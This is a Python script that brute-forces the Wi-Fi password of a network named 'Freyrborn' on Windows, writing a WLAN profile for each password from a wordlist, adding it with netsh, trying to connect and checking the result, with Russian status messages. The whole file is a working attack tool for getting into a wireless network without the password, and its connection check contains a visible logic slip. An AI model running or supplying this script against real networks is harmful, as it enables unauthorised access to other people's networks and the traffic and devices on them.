import subprocess
import time

WIFI_NAME = "Freyrborn"

PASSWORD_FILE = "passwords.txt"

XML_PATH = "wifi-profile.xml"

def create_wifi_profile(name, password, path):
    profile = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{name}</name>
    <SSIDConfig>
        <SSID>
            <name>{name}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''

    with open(path, 'w') as file:
        file.write(profile)

def is_connected():
    result = subprocess.check_output('netsh wlan show interfaces', shell=True, text=True, encoding='cp866')
    return "Состояние" in result and "подключено" and WIFI_NAME  in result


def brute_force_wifi():
    with open(PASSWORD_FILE, 'r') as file:
        passwords = [line.strip() for line in file]

    for password in passwords:
        print(f" Пробуем пароль: {password}")
        create_wifi_profile(WIFI_NAME, password, XML_PATH)
        subprocess.run(f'netsh wlan add profile filename="{XML_PATH}"', shell=True, stdout=subprocess.DEVNULL)
        subprocess.run(f'netsh wlan connect name="{WIFI_NAME}"', shell=True, stdout=subprocess.DEVNULL)
        time.sleep(5)
        print("Пароль непраивльный")
        if is_connected():
            print("Пароль правльный")
            break


if __name__ == "__main__":
    brute_force_wifi()
